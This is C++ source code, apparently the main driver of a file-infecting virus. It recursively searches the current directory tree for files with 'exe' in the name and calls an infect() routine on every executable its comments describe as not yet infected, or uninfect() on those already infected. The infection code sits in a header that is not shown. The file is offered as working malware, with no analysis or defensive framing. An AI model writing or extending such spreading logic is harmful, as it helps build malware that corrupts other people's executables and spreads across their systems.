#pragma once
#include <stdio.h>
#include <stdlib.h>
#include "BaseTool.h"
#include <iostream>
#include <io.h>
#include <direct.h>

//#define DEBUG
#define MAX_PATH 100

using namespace std;

void findAllFile(__in const char* path, __in const char* format, __out int* count)
{
	char newpath[200];
	strcpy(newpath, path);
	strcat(newpath, "\\*.*");    // 在目录后面加上"\\*.*"进行第一次搜索
	int handle;
	_finddata_t findData;
	handle = _findfirst(newpath, &findData);
	if (handle == -1)        // 检查是否成功
	{
		printf("检索文件失败\n");
		return;
	}
	while (_findnext(handle, &findData) == 0) {
		if (findData.attrib & _A_SUBDIR) {
			if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
				continue;
			strcpy(newpath, path);
			strcat(newpath, "\\");
			strcat(newpath, findData.name);
			findAllFile(newpath, format, count);
		}
		else {
			if (strstr (findData.name, format)) {     //判断是不是txt文件
				char szPath[200];
				strcpy(szPath, path);
				strcat(szPath, "\\");
				strcat(szPath, findData.name);
				cout << "\n**************************************************\n";
				cout << "Find:" << findData.name << "\t" << path << "\t" << findData.size << " bytes.\n";

				int flag = BaseTool::isSuitable(szPath);
				//目标未被感染, 执行文件感染
				if (flag == 2)
				{
					printf("infecting %s.....\n", szPath);
					BaseTool pe(szPath);
					pe.infect();
					printf("Finished....\n");
				}
				//目标已经被感染, 执行文件恢复
				if (flag == 1)
				{
					printf("uninfecting %s.....\n", szPath);
					BaseTool pe(szPath);
					pe.uninfect();
					printf("Finished....\n");
				}
				(*count)++;
			}
		}
	}
	_findclose(handle);    // 关闭搜索句柄
}


int main()
{
	int count = 0;
	char szPath[MAX_PATH];
	_getcwd(szPath, sizeof(szPath));
	findAllFile(szPath, "exe", &count);
	printf("\n共遍历到%d个PE文件\n", count);

	system("pause");
	return 0;
}

